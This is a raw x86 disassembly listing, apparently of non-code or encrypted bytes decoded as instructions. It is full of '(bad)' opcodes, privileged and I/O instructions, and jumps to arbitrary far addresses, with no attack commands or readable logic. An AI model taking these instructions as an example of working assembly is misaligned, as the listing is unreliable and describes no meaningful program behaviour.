  41da68:	push   esp
  41da69:	mov    eax,0x6064831c
  41da6e:	add    al,0x26
  41da70:	sub    edi,eax
  41da72:	fdivr  QWORD PTR [edi]
  41da74:	(bad)  
  41da75:	repnz xor al,0x0
  41da78:	mov    ds:0x4ce61d2e,eax
  41da7d:	cli    
  41da7e:	into   
  41da7f:	out    dx,al
  41da80:	stc    
  41da81:	mul    BYTE PTR [ecx-0x303fd840]
  41da87:	pop    esp
  41da88:	push   ss
  41da89:	popf   
  41da8a:	iret   
  41da8b:	mov    eax,ds:0xca86036
  41da90:	add    ch,BYTE PTR [eax+0x5de749e7]
  41da96:	sub    eax,0xc1586d75
  41da9b:	xlat   BYTE PTR ds:[ebx]
  41da9c:	cwde   
  41da9d:	mov    edi,0x4a107cac
  41daa2:	jnp    0x41da2e
  41daa4:	push   eax
  41daa5:	mov    edx,0x6dcfcb
  41daaa:	aaa    
  41daab:	jle    0x41dafc
  41daad:	test   BYTE PTR [eax-0x56],ch
  41dab0:	outs   dx,DWORD PTR ds:[esi]
  41dab1:	aas    
  41dab2:	sahf   
  41dab3:	cmp    bl,dl
  41dab5:	imul   esi,DWORD PTR [ecx-0x3f],0x7f6d281c
  41dabc:	aad    0xbc
  41dabe:	loop   0x41dace
  41dac0:	mov    esi,0xaa4d79dd
  41dac5:	jle    0x41db09
  41dac7:	inc    esp
  41dac8:	cdq    
  41dac9:	sar    BYTE PTR [eax+0x499ac763],1
  41dacf:	sub    esi,DWORD PTR [ebp+0x8]
  41dad2:	stos   BYTE PTR es:[edi],al
  41dad3:	in     al,dx
  41dad4:	mul    DWORD PTR [edx-0x91d273d]
  41dada:	arpl   WORD PTR [edi],cx
  41dadc:	inc    edi
  41dadd:	cmp    DWORD PTR [esp+edx*4+0x0],0x0
  41dae5:	add    BYTE PTR [eax],al
  41dae7:	add    BYTE PTR [eax],al
  41dae9:	add    BYTE PTR [eax],al
  41daeb:	fnstenv [esi-0x2490e49a]
  41daf1:	std    
  41daf2:	neg    BYTE PTR [esi]
  41daf4:	sub    esp,DWORD PTR [ebx-0x23]
  41daf7:	mov    ah,0xa
  41daf9:	xchg   ebp,eax
  41dafa:	ror    DWORD PTR [eax-0x67],cl
  41dafd:	add    DWORD PTR [eax],eax
  41daff:	lods   eax,DWORD PTR ds:[esi]
  41db00:	add    BYTE PTR [eax],al
  41db02:	add    cl,bh
  41db04:	shl    DWORD PTR [esi+0x70734c1b],1
  41db0a:	xor    ax,0xda5b
  41db0e:	inc    ebp
  41db0f:	cmp    dh,BYTE PTR [eax+eiz*8]
  41db12:	cmp    eax,0x16f656c6
  41db17:	add    BYTE PTR [edx],al
  41db19:	pop    edi
  41db1a:	jbe    0x41daa3
  41db1c:	aad    0x7f
  41db1e:	and    esp,esp
  41db20:	idiv   BYTE PTR [ebx-0x78dddfb8]
  41db26:	xchg   ebp,eax
  41db27:	mov    DWORD PTR [ecx],esi
  41db29:	out    0x2b,eax
  41db2b:	or     ah,BYTE PTR [edx+edi*2]
  41db2e:	add    al,0xd2
  41db30:	add    dl,0xe3
  41db33:	mov    edx,0x1657570b
  41db38:	push   cs
  41db39:	push   ebx
  41db3a:	push   cs
  41db3b:	sub    DWORD PTR [edx],edx
  41db3d:	xchg   ecx,eax
  41db3e:	es mov ebp,0xbdeb0ed6
  41db44:	test   al,0xe7
  41db46:	xchg   ebx,eax
  41db47:	arpl   WORD PTR [ebx+edx*1+0x6fecd31f],bp
  41db4e:	std    
  41db4f:	popf   
  41db50:	dec    edi
  41db51:	mov    esp,0x43c4d6a0
  41db56:	clc    
  41db57:	in     al,0x6f
  41db59:	out    dx,eax
  41db5a:	pushf  
  41db5b:	xchg   BYTE PTR [esi-0x9],bh
  41db5e:	jle    0x41dbc3
  41db60:	fldl2t 
  41db62:	fisub  DWORD PTR [esp+ebp*2-0x5423442]
  41db69:	rcr    BYTE PTR [eax+0x1b],cl
  41db6c:	pusha  
  41db6d:	div    BYTE PTR ds:0x4e339f2
  41db73:	mov    edi,0x162cf0b
  41db78:	inc    esi
  41db79:	icebp  
  41db7a:	mov    ch,0x31
  41db7c:	pop    eax
  41db7d:	and    bl,BYTE PTR [eax+0x31f3667d]
  41db83:	push   edi
  41db84:	fist   DWORD PTR [ebp+0x26874ac9]
  41db8a:	pop    ebp
  41db8b:	int3   
  41db8c:	mov    esp,0xc12a8341
  41db91:	or     al,0xa2
  41db93:	das    
  41db94:	lds    esp,FWORD PTR [ebx+0x61da03c2]
  41db9a:	(bad)  
  41db9b:	xchg   ebx,eax
  41db9c:	sbb    esp,DWORD PTR [esi+0x313694e2]
  41dba2:	je     0x41dc18
  41dba4:	icebp  
  41dba5:	les    edi,FWORD PTR [esi+0x3]
  41dba8:	adc    al,0xf6
  41dbaa:	out    0x3c,al
  41dbac:	sub    al,BYTE PTR [edx]
  41dbae:	outs   dx,BYTE PTR ds:[esi]
  41dbaf:	out    dx,eax
	...
  41dbb8:	add    BYTE PTR [eax],al
  41dbba:	add    dl,bl
  41dbbc:	xor    dl,BYTE PTR [edi-0x20500076]
  41dbc2:	jb     0x41dbc7
  41dbc4:	inc    ebp
  41dbc5:	mov    ds:0xd9ccaa5c,eax
  41dbca:	push   ecx
  41dbcb:	cmc    
  41dbcc:	cdq    
  41dbcd:	add    DWORD PTR [eax],eax
  41dbcf:	lods   eax,DWORD PTR ds:[esi]
  41dbd0:	add    BYTE PTR [eax],al
  41dbd2:	add    BYTE PTR [ecx+edx*1],bh
  41dbd5:	cmp    BYTE PTR [ebx],al
  41dbd7:	lahf   
  41dbd8:	cmp    DWORD PTR [ecx+esi*8+0x52],edx
  41dbdc:	push   edx
  41dbdd:	cmp    DWORD PTR [edx+0x7283731f],edi
  41dbe3:	xlat   BYTE PTR ds:[ebx]
  41dbe4:	jp     0x41dc4e
  41dbe6:	rcl    BYTE PTR [esi-0x3dfdace1],1
  41dbec:	leave  
  41dbed:	test   DWORD PTR [ebp-0xe43939f],edi
  41dbf3:	xlat   BYTE PTR ds:[ebx]
  41dbf4:	push   ebp
  41dbf5:	inc    edi
  41dbf6:	mov    cl,0xc7
  41dbf8:	adc    bl,ch
  41dbfa:	jmp    0x41dbb9
  41dbfc:	fcmove st,st(7)
  41dbfe:	lods   eax,DWORD PTR ds:[esi]
  41dbff:	dec    eax
  41dc00:	adc    DWORD PTR [ebp+0x48],ebx
  41dc03:	adc    esi,DWORD PTR [edi]
  41dc05:	inc    esi
  41dc06:	sbb    BYTE PTR [eax+0x78a1982d],bh
  41dc0c:	test   eax,0xc0f32906
  41dc11:	test   eax,0x737f88a4
  41dc16:	push   edi
  41dc17:	cmp    ch,BYTE PTR [edx+ecx*4+0x4b]
  41dc1b:	(bad)  
  41dc1c:	mov    eax,ds:0xa9b8bef4
  41dc21:	sbb    eax,0x2af920a6
  41dc26:	mov    ebx,0xcc167790
  41dc2b:	mov    bl,0x2e
  41dc2d:	mov    edx,0xebeb7920
  41dc32:	loop   0x41dc48
  41dc34:	ds repz jmp 0xdb23a983
  41dc3b:	scas   al,BYTE PTR es:[edi]
  41dc3c:	pop    esi
  41dc3d:	retf   0xe925
  41dc40:	sbb    cl,BYTE PTR [ecx-0x38]
  41dc43:	cmp    bh,BYTE PTR [ecx+edx*8+0x5c2a2886]
  41dc4a:	cmp    eax,0xd7447944
  41dc4f:	iret   
  41dc50:	iret   
  41dc51:	call   0x79a7:0xccf7fa7b
  41dc58:	loope  0x41dc74
  41dc5a:	dec    ebx
  41dc5b:	call   0xf3d2fe7e
  41dc60:	sub    eax,0xb8496215
  41dc65:	adc    cl,BYTE PTR [ecx-0x4c]
  41dc68:	dec    ebp
  41dc69:	fwait
  41dc6a:	in     eax,0x10
  41dc6c:	and    al,0x6e
  41dc6e:	pop    esp
  41dc6f:	xchg   BYTE PTR [edx-0x34c5c002],dh
  41dc75:	stos   DWORD PTR es:[edi],eax
  41dc76:	pop    esp
  41dc77:	dec    esp
  41dc78:	mov    WORD PTR [edi+0x24a842ff],ds
  41dc7e:	adc    ch,bl
	...
  41dc88:	add    BYTE PTR [eax],al
  41dc8a:	add    BYTE PTR [eax-0x1c],cl
  41dc8d:	add    ebx,DWORD PTR [ebx-0x8270051]
  41dc93:	pop    esi
  41dc94:	sub    BYTE PTR [eax+0x1c4088f],bl
  41dc9a:	test   DWORD PTR [edx-0x52fffe66],esp
  41dca0:	add    BYTE PTR [eax],al
  41dca2:	add    dh,bl
  41dca4:	and    ebx,edi
  41dca6:	mov    BYTE PTR [edx-0x6a],cl
  41dca9:	mov    esp,0xfd375dc1
  41dcae:	(bad)  
  41dcaf:	sub    eax,ebp
  41dcb1:	clc    
  41dcb2:	pusha  
  41dcb3:	test   BYTE PTR [ecx],dh
  41dcb5:	pop    es
  41dcb6:	je     0x41dd2b
  41dcb8:	sbb    ah,BYTE PTR [esi+0x1a1bc081]
  41dcbe:	or     BYTE PTR [eax-0xd],ah
  41dcc1:	inc    edx
  41dcc2:	jb     0x41dd1c
  41dcc4:	comiss xmm0,DWORD PTR [edx-0x15a4b6f9]
  41dccb:	repz inc esp
  41dccd:	sub    eax,0x9308297b
  41dcd2:	aaa    
  41dcd3:	pop    ebx
  41dcd4:	adc    al,0xac
  41dcd6:	push   ss
  41dcd7:	jp     0x41dc7b
  41dcd9:	and    eax,0xe926bbb
  41dcde:	sbb    al,0xb2
  41dce0:	aaa    
  41dce1:	out    0x4c,al
  41dce3:	mov    esp,0x90bdd77
  41dce8:	jg     0x41dd3d
  41dcea:	sub    bh,BYTE PTR ds:[esi]
  41dced:	aas    
  41dcee:	imul   ecx,DWORD PTR gs:[edx+0x78],0x907bdaa3
  41dcf6:	aad    0x4b
  41dcf8:	xlat   BYTE PTR ds:[ebx]
  41dcf9:	in     eax,0x32
  41dcfb:	or     al,0xea
  41dcfd:	mov    esi,DWORD PTR [edx]
  41dcff:	dec    eax
  41dd00:	adc    dl,BYTE PTR [eax-0x4d6042b4]
  41dd06:	hlt    
  41dd07:	xlat   BYTE PTR ds:[ebx]
  41dd08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dd09:	aad    0x9f
  41dd0b:	dec    ebp
  41dd0c:	int    0xa1
  41dd0e:	scas   al,BYTE PTR es:[edi]
  41dd0f:	sahf   
  41dd10:	fadd   QWORD PTR [esp+edi*2+0x1179acdf]
  41dd17:	fist   WORD PTR [eax+0x4a831323]
  41dd1d:	ret    0xfe83
  41dd20:	aad    0x6e
  41dd22:	push   ebx
  41dd23:	sbb    al,0x9f
  41dd25:	cmovs  ecx,DWORD PTR [ebp+0x58672f85]
  41dd2c:	push   edi
  41dd2d:	lock mov DWORD PTR [edi],ebp
  41dd30:	dec    ebx
  41dd31:	jmp    0x41dd1b
  41dd33:	sub    BYTE PTR [edx-0x3c6545a3],bh
  41dd39:	jmp    0x7ba9:0x6c841a25
  41dd40:	ss mov al,0x3a
  41dd43:	jo     0x41dd77
  41dd45:	or     dl,BYTE PTR [esi]
  41dd47:	dec    ecx
  41dd48:	lods   al,BYTE PTR ds:[esi]
  41dd49:	fnsave [eax+ecx*4-0x315eb898]
	...
  41dd58:	add    BYTE PTR [eax],al
  41dd5a:	add    BYTE PTR [edx+0x4],dl
  41dd5d:	mov    ds:0x72a6f682,al
  41dd62:	aam    0x6d
  41dd64:	xor    dh,BYTE PTR [edx]
  41dd66:	and    eax,0x7052bd3b
  41dd6b:	dec    edi
  41dd6c:	fwait
  41dd6d:	add    DWORD PTR [eax],eax
  41dd6f:	lods   eax,DWORD PTR ds:[esi]
  41dd70:	add    BYTE PTR [eax],al
  41dd72:	add    ch,ah
  41dd74:	clc    
  41dd75:	ds test eax,edx
  41dd78:	pop    esp
  41dd79:	ja     0x41dd2e
  41dd7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dd7c:	loope  0x41dd46
  41dd7e:	gs xchg ebx,eax
  41dd80:	add    bh,bh
  41dd82:	adc    dh,cl
  41dd84:	hlt    
  41dd85:	cmc    
  41dd86:	das    
  41dd87:	push   ebp
  41dd88:	adc    cl,BYTE PTR [ecx-0x7b]
  41dd8b:	push   esi
  41dd8c:	pop    ecx
  41dd8d:	sti    
  41dd8e:	add    cl,dh
  41dd90:	jp     0x41dda8
  41dd92:	in     al,dx
  41dd93:	sub    DWORD PTR [edx+0x78f29e6f],ecx
  41dd99:	fistp  QWORD PTR [esi-0x1c]
  41dd9c:	lahf   
  41dd9d:	hlt    
  41dd9e:	jb     0x41dd5e
  41dda0:	lods   al,BYTE PTR ds:[esi]
  41dda1:	and    esi,DWORD PTR [eax-0x4d288a6]
  41dda7:	gs aam 0xd1
  41ddaa:	cld    
  41ddab:	fisttp DWORD PTR [ecx-0xc]
  41ddae:	push   ds
  41ddaf:	(bad)  
  41ddb0:	int3   
  41ddb1:	sahf   
  41ddb2:	ret    0xcd4d
  41ddb5:	shl    ebp,1
  41ddb7:	ja     0x41de25
  41ddb9:	je     0x41dd70
  41ddbb:	pusha  
  41ddbc:	mov    al,ds:0x72e67e30
  41ddc1:	jge    0x41dd7c
  41ddc3:	and    eax,0x51cf9895
  41ddc8:	sub    al,0xc4
  41ddca:	push   ebx
  41ddcb:	jae    0x41ddfe
  41ddcd:	ret    0x54bc
  41ddd0:	mov    WORD PTR [ebx],fs
  41ddd2:	fisttp DWORD PTR [esi+edx*4+0x59d11fc8]
  41ddd9:	push   esp
  41ddda:	pop    ds
  41dddb:	jb     0x41dda0
  41dddd:	stc    
  41ddde:	dec    ecx
  41dddf:	dec    esi
  41dde0:	mov    ecx,0x3a065e16
  41dde5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dde6:	mov    es,WORD PTR [edx-0x292c4c53]
  41ddec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dded:	dec    eax
  41ddee:	jcxz   0x41ddba
  41ddf1:	jecxz  0x41de58
  41ddf3:	xchg   ebp,eax
  41ddf4:	arpl   WORD PTR [eax+0x6fb32606],sp
  41ddfa:	sub    al,0x25
  41ddfc:	pop    edx
  41ddfd:	add    BYTE PTR [ecx],ch
  41ddff:	dec    edi
  41de00:	repz push es
  41de02:	js     0x41ddf7
  41de04:	loopne 0x41ddea
  41de06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41de07:	mov    bl,0x16
  41de09:	dec    ebx
  41de0a:	aaa    
  41de0b:	add    BYTE PTR [ebp-0x30],0xd0
  41de0f:	enter  0xda2d,0x69
  41de13:	cmp    eax,0xe54978b5
  41de18:	outs   dx,DWORD PTR ds:[esi]
  41de19:	pop    ecx
  41de1a:	mov    edi,0x8dcc4a13
  41de1f:	dec    eax
	...
  41de28:	add    BYTE PTR [eax],al
  41de2a:	add    BYTE PTR [eax],bh
  41de2c:	push   0xffffff96
  41de2e:	add    edx,esi
  41de30:	(bad)  
  41de31:	mov    ebp,0xdb4ef67b
  41de36:	out    0x25,eax
  41de38:	adc    al,0x4e
  41de3a:	imul   edi,esp,0xad00019b
  41de40:	add    BYTE PTR [eax],al
  41de42:	add    al,ah
  41de44:	popf   
  41de45:	mov    ds:0xfcd2cafe,al
  41de4a:	sti    
  41de4b:	dec    esi
  41de4c:	cmp    ebp,DWORD PTR [ebx+0x683a2e2f]
  41de52:	sbb    ecx,edx
  41de54:	sar    BYTE PTR [ecx+0x5e503e0c],1
  41de5a:	jecxz  0x41de76
  41de5c:	push   es
  41de5d:	loop   0x41de4e
  41de5f:	int    0x34
  41de61:	scas   al,BYTE PTR es:[edi]
  41de62:	pop    ecx
  41de63:	mov    al,BYTE PTR [ecx+ebp*8-0x443f0670]
  41de6a:	and    eax,DWORD PTR [esi-0x10205bcb]
  41de70:	xchg   edi,eax
  41de71:	rol    BYTE PTR [ecx-0x1],1
  41de74:	(bad)  
  41de75:	xchg   ecx,eax
  41de76:	mov    ebx,0xd31f7c52
  41de7b:	cli    
  41de7c:	mov    bh,0x16
  41de7e:	sub    dh,BYTE PTR cs:[ecx+ebx*2]
  41de82:	xlat   BYTE PTR ds:[ebx]
  41de83:	rol    ecx,0xcd
  41de86:	mov    WORD PTR [edx],?
  41de88:	lods   al,BYTE PTR ds:[esi]
  41de89:	paddb  mm2,QWORD PTR [edx+esi*4+0x7c]
  41de8e:	ins    BYTE PTR es:[edi],dx
  41de8f:	and    ebx,DWORD PTR [edi+esi*2-0x627ddd38]
  41de96:	cli    
  41de97:	xchg   BYTE PTR [esi+0x67],ch
  41de9a:	(bad)  
  41de9b:	cmp    BYTE PTR [ecx-0x41],cl
  41de9e:	push   ecx
  41de9f:	loopne 0x41dea0
  41dea1:	sbb    BYTE PTR [ecx],ah
  41dea3:	add    BYTE PTR [ecx],dl
  41dea5:	cwde   
  41dea6:	inc    ecx
  41dea7:	popa   
  41dea8:	test   ebx,ebx
  41deaa:	fucom  st(2)
  41deac:	push   esp
  41dead:	rcr    ebx,0xd0
  41deb0:	repz jg 0x41de53
  41deb3:	ins    BYTE PTR es:[edi],dx
  41deb4:	sbb    BYTE PTR [ebx-0x46],bl
  41deb7:	hlt    
  41deb8:	in     al,0xf6
  41deba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41debb:	inc    ecx
  41debc:	popf   
  41debd:	enter  0x653d,0x39
  41dec1:	jp     0x41deeb
  41dec3:	gs sub edx,edx
  41dec6:	jle    0x41df1e
  41dec8:	or     BYTE PTR [eax-0x25],ah
  41decb:	cmp    eax,0x60f2adb7
  41ded0:	ins    BYTE PTR es:[edi],dx
  41ded1:	pushf  
  41ded2:	push   eax
  41ded3:	int3   
  41ded4:	ins    DWORD PTR es:[edi],dx
  41ded5:	loop   0x41de76
  41ded7:	fisttp WORD PTR [esi+0x75f54773]
  41dedd:	mov    al,ds:0x37fb5233
  41dee2:	jg     0x41def1
  41dee4:	lea    edx,[ecx-0x33ccde45]
  41deea:	loopne 0x41ded0
  41deec:	jl     0x41df69
  41deee:	push   ss
  41deef:	push   cs
	...
  41def8:	add    BYTE PTR [eax],al
  41defa:	add    cl,ch
  41defc:	mov    ecx,0xf37a307a
  41df01:	jmp    0x41defc
  41df03:	fimul  DWORD PTR [esp+eax*2+0x6c]
  41df07:	dec    edi
  41df08:	sbb    eax,0x9ca9d22e
  41df0d:	add    DWORD PTR [eax],eax
  41df0f:	lods   eax,DWORD PTR ds:[esi]
  41df10:	add    BYTE PTR [eax],al
  41df12:	add    BYTE PTR [esi-0x72402db3],ch
  41df18:	stos   BYTE PTR es:[edi],al
  41df19:	and    al,0xa6
  41df1b:	int3   
  41df1c:	pop    ss
  41df1d:	adc    dh,BYTE PTR [edi]
  41df1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41df20:	xor    ebp,0xffffffcf
  41df23:	stos   DWORD PTR es:[edi],eax
  41df24:	rsm    
  41df26:	int    0x4f
  41df28:	push   edi
  41df29:	pop    edx
  41df2a:	xor    cl,dl
  41df2c:	loopne 0x41df48
  41df2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41df2f:	paddd  mm2,QWORD PTR [esi]
  41df32:	jnp    0x41df17
  41df34:	xchg   BYTE PTR [ebx],bl
  41df36:	pop    ebp
  41df37:	jg     0x41debf
  41df39:	xchg   esi,eax
  41df3a:	sub    DWORD PTR [edi+0x2c],0xffffffa5
  41df3e:	or     ch,dh
  41df40:	(bad)  
  41df41:	jg     0x41df17
  41df43:	fst    DWORD PTR [esi]
  41df45:	jp     0x41deeb
  41df47:	xchg   DWORD PTR [ebp-0x1ef81bf3],ecx
  41df4d:	push   ecx
  41df4e:	repnz mov edi,0x6e1f7dd
  41df54:	aad    0xfd
  41df56:	ins    DWORD PTR es:[edi],dx
  41df57:	xchg   edx,eax
  41df58:	mov    edi,0xef0fc75c
  41df5d:	jp     0x41df5d
  41df5f:	popa   
  41df60:	sbb    DWORD PTR [esi],0x7c60498b
  41df66:	sti    
  41df67:	shl    bl,1
  41df69:	sbb    ah,BYTE PTR [ebx+0x3010ee82]
  41df6f:	stos   DWORD PTR es:[edi],eax
  41df70:	bound  ecx,QWORD PTR [ebp-0x42]
  41df73:	cmp    esp,DWORD PTR [ebx+0x72607819]
  41df79:	pop    ebp
  41df7a:	jmp    0x2b06:0x1ddaaf70
  41df81:	inc    edx
  41df82:	enter  0xceea,0xe3
  41df86:	test   al,0x65
  41df88:	mov    ch,0x40
  41df8a:	sbb    BYTE PTR [ebp-0x31],al
  41df8d:	add    DWORD PTR [ebx-0x5a],0x52b3aa33
  41df94:	xchg   ecx,eax
  41df95:	ret    
  41df96:	mov    WORD PTR [esi],es
  41df98:	ror    BYTE PTR [eax],1
  41df9a:	int    0xde
  41df9c:	pop    eax
  41df9d:	pop    ebp
  41df9e:	int3   
  41df9f:	mov    WORD PTR [esi+edi*2-0x6b0d2218],es
  41dfa6:	shl    BYTE PTR [ebx+0xe],1
  41dfa9:	call   0x290845eb
  41dfae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dfaf:	call   0x5131533
  41dfb4:	xchg   al,bl
  41dfb6:	js     0x41df89
  41dfb8:	(bad)  
  41dfb9:	cmc    
  41dfba:	inc    edi
  41dfbb:	je     0x41e00f
  41dfbd:	gs rcl dh,cl
	...
  41dfc8:	add    BYTE PTR [eax],al
  41dfca:	add    BYTE PTR [ebx+0x41],bl
  41dfcd:	pop    ebx
  41dfce:	iret   
  41dfcf:	pop    ebx
  41dfd0:	(bad)  
  41dfd2:	aad    0xf
  41dfd4:	ss dec esp
  41dfd6:	dec    esi
  41dfd7:	mov    eax,ds:0x565d1299
  41dfdc:	popf   
  41dfdd:	add    DWORD PTR [eax],eax
  41dfdf:	lods   eax,DWORD PTR ds:[esi]
  41dfe0:	add    BYTE PTR [eax],al
  41dfe2:	add    BYTE PTR [ebp-0x25c2278a],al
  41dfe8:	stos   DWORD PTR es:[edi],eax
  41dfe9:	and    eax,0x94073f5d
  41dfee:	(bad)  
  41dfef:	jg     0x41dfbb
  41dff1:	jb     0x41e037
  41dff3:	push   edi
  41dff4:	pop    esp
  41dff5:	int3   
  41dff6:	jge    0x41e05f
  41dff8:	les    eax,FWORD PTR ds:0x2f92d03f
  41dffe:	(bad)  
  41e000:	and    eax,0xa43d8695
  41e005:	mov    ecx,0xa255cd32
  41e00a:	pop    ss
  41e00b:	repz mov ds:0xd9e2c965,al
  41e011:	or     WORD PTR [ecx],di
  41e014:	cmp    BYTE PTR [ebp-0x1ac0db76],ch
  41e01a:	inc    eax
  41e01b:	or     eax,0xb2378d88
  41e020:	aad    0x4c
  41e022:	add    ch,ch
  41e024:	addr16 push esi
  41e026:	(bad)  
  41e027:	ja     0x41e03d
  41e029:	fist   WORD PTR [ebx-0x3f42f5a8]
  41e02f:	in     al,0x4f
  41e031:	pop    edi
  41e032:	jo     0x41e050
  41e034:	push   ecx
  41e035:	jmp    0x3fd0:0x53079cb1
  41e03c:	test   DWORD PTR [edi+0x376cec4e],0x717a355d
  41e046:	sbb    ah,0xdd
  41e049:	mov    cs,WORD PTR [ecx+0x31]
  41e04c:	pop    edi
  41e04d:	or     dl,BYTE PTR [edi]
  41e04f:	pop    es
  41e050:	add    eax,0x94603482
  41e055:	cwde   
  41e056:	outs   dx,BYTE PTR ds:[esi]
  41e057:	adc    al,0x84
  41e059:	jp     0x41e0ca
  41e05b:	ret    
  41e05c:	lds    ebx,FWORD PTR [edi]
  41e05e:	fisttp DWORD PTR [eax+0x60]
  41e061:	jb     0x41e089
  41e063:	adc    eax,0xe49817c5
  41e068:	pop    ds
  41e069:	fldcw  WORD PTR [edi+0x43]
  41e06c:	call   0xfe9d:0x51ae4a9c
  41e073:	xor    cl,0xa
  41e076:	fidiv  WORD PTR [ecx+esi*2-0x39652226]
  41e07d:	dec    ebx
  41e07e:	cmp    edx,DWORD PTR [edx-0x1ee272cd]
  41e084:	cmp    bl,bh
  41e086:	int3   
  41e087:	and    eax,0xd5f9b38c
  41e08c:	mov    cl,0x68
  41e08e:	rcl    BYTE PTR [ebx+0x0],0x0
  41e095:	add    BYTE PTR [eax],al
  41e097:	add    BYTE PTR [eax],al
  41e099:	add    BYTE PTR [eax],al
  41e09b:	fwait
  41e09c:	test   DWORD PTR [ebp+0x3c],esp
  41e09f:	jg     0x41e09d
  41e0a1:	(bad)  [edi-0x65be08a1]
  41e0a7:	in     al,0x53
  41e0a9:	in     eax,dx
  41e0aa:	nop
  41e0ab:	add    ebx,DWORD PTR [esi+0xad0001]
  41e0b1:	add    BYTE PTR [eax],al
  41e0b3:	xchg   BYTE PTR [ebp+0x9848b62],ah
  41e0b9:	addr16 fxch st(7)
  41e0bc:	mov    ecx,0xa81f90a6
  41e0c1:	icebp  
  41e0c2:	imul   edx,edi,0x972d93a5
  41e0c8:	jno    0x41e138
  41e0ca:	int    0x1c
  41e0cc:	inc    ebx
  41e0cd:	(bad)  
  41e0ce:	xor    ebx,DWORD PTR [edi]
  41e0d0:	cmp    BYTE PTR [ebx+edx*2+0x44],dh
  41e0d4:	lea    esp,fs:[ebx]
  41e0d7:	inc    ecx
  41e0d8:	pop    edx
  41e0d9:	imul   ebp,DWORD PTR [edi-0x6b],0xffffffc8
  41e0dd:	es pop edi
  41e0df:	and    al,0xc0
  41e0e1:	(bad)  
  41e0e2:	xor    al,0x2a
  41e0e4:	ret    
  41e0e5:	mov    ds:0x225f8ee9,al
  41e0ea:	mov    al,ds:0x6cd3c2ce
  41e0ef:	sti    
  41e0f0:	and    al,0xe2
  41e0f2:	hlt    
  41e0f3:	scas   eax,DWORD PTR es:[edi]
  41e0f4:	bound  ax,DWORD PTR fs:[ecx-0x5b]
  41e0f9:	mov    bl,al
  41e0fb:	push   esi
  41e0fc:	xchg   esi,eax
  41e0fd:	imul   ebp,ebx,0xffffffc4
  41e100:	fwait
  41e101:	pop    ss
  41e102:	jb     0x41e11d
  41e104:	ins    DWORD PTR es:[edi],dx
  41e105:	ss jmp 0x41e0a5
  41e108:	loope  0x41e156
  41e10a:	das    
  41e10b:	or     DWORD PTR [edx],0xbc48d91b
  41e111:	or     al,0x34
  41e113:	sub    dl,BYTE PTR [edi+0x4]
  41e116:	xor    BYTE PTR [ecx],ch
  41e118:	cld    
  41e119:	rcr    BYTE PTR ds:0x3aec09b4,1
  41e11f:	mov    ah,0xf
  41e121:	mov    edx,0x9374f020
  41e126:	les    esp,FWORD PTR [ebx]
  41e128:	dec    BYTE PTR [eax-0x32]
  41e12b:	mov    ah,0xdb
  41e12d:	jno    0x41e17c
  41e12f:	cmp    BYTE PTR [esp+esi*4+0xc6433ba],0x5a
  41e137:	retf   
  41e138:	pushf  
  41e139:	inc    ebp
  41e13a:	pop    es
  41e13b:	xor    eax,ebp
  41e13d:	sbb    BYTE PTR ss:[edx+ebp*2-0x57e56596],bl
  41e145:	sub    al,0xac
  41e147:	mov    ch,0xd7
  41e149:	pop    edx
  41e14a:	arpl   WORD PTR [ecx-0x34ebf031],cx
  41e150:	shl    BYTE PTR ds:0x5cc86624,1
  41e156:	xor    eax,0x739afe3a
  41e15b:	fcomp  DWORD PTR [edx-0x2b]
  41e15e:	jo     0x41e1d3
	...
  41e168:	add    BYTE PTR [eax],al
  41e16a:	add    BYTE PTR [esi+0x73],ch
  41e16d:	lock retf 0xcbfd
  41e171:	jle    0x41e16a
  41e173:	repz xor eax,0x35368ce9
  41e179:	aas    
  41e17a:	jo     0x41e12c
  41e17c:	sahf   
  41e17d:	add    DWORD PTR [eax],eax
  41e17f:	lods   eax,DWORD PTR ds:[esi]
  41e180:	add    BYTE PTR [eax],al
  41e182:	add    BYTE PTR [ecx-0x5c],bh
  41e185:	pop    ecx
  41e186:	push   es
  41e187:	ds icebp 
  41e189:	bound  esi,QWORD PTR ss:[esi-0x56]
  41e18d:	ins    BYTE PTR es:[edi],dx
  41e18e:	jae    0x41e194
  41e190:	cmp    ecx,esi
  41e192:	inc    edi
  41e193:	adc    DWORD PTR [eax+edi*4-0x2b427904],esi
  41e19a:	js     0x41e1be
  41e19c:	leave  
  41e19d:	stos   DWORD PTR es:[edi],eax
  41e19e:	inc    ebx
  41e19f:	and    edx,esi
  41e1a1:	dec    ebx
  41e1a2:	outs   dx,DWORD PTR ds:[esi]
  41e1a3:	jns    0x41e131
  41e1a5:	push   edi
  41e1a6:	jp     0x41e1af
  41e1a8:	sub    BYTE PTR [edi-0x49db6a28],0x9a
  41e1af:	jae    0x41e16d
  41e1b1:	dec    esp
  41e1b2:	add    DWORD PTR [ebx+0xf],eax
  41e1b5:	lds    edi,FWORD PTR [eax+ebx*1+0x1]
  41e1b9:	pop    ebx
  41e1ba:	xchg   esp,eax
  41e1bb:	ja     0x41e1d4
  41e1bd:	mov    DWORD PTR [edi+0x40a5258d],edx
  41e1c3:	ins    DWORD PTR es:[edi],dx
  41e1c4:	mov    edx,DWORD PTR [edx-0x4b950974]
  41e1ca:	jmp    0xe0466e8f
  41e1cf:	xchg   esi,eax
  41e1d0:	out    0xf9,eax
  41e1d2:	icebp  
  41e1d3:	leave  
  41e1d4:	fnstsw WORD PTR [esi+edi*2+0x3d3335d6]
  41e1db:	enter  0x16a6,0xda
  41e1df:	cmp    eax,0x2578c6b7
  41e1e4:	pop    eax
  41e1e5:	mov    esi,ebx
  41e1e7:	adc    BYTE PTR [ebp+0x1acdafba],0x33
  41e1ee:	out    dx,eax
  41e1ef:	adc    bh,cl
  41e1f1:	sbb    DWORD PTR [ecx+0x5ffab718],ebp
  41e1f7:	mov    ch,0x82
  41e1f9:	cmp    edx,DWORD PTR [eax]
  41e1fb:	cwde   
  41e1fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e1fd:	in     al,dx
  41e1fe:	cmp    BYTE PTR [ebx+0x75],bl
  41e201:	xchg   ebp,eax
  41e202:	jne    0x41e222
  41e204:	pop    eax
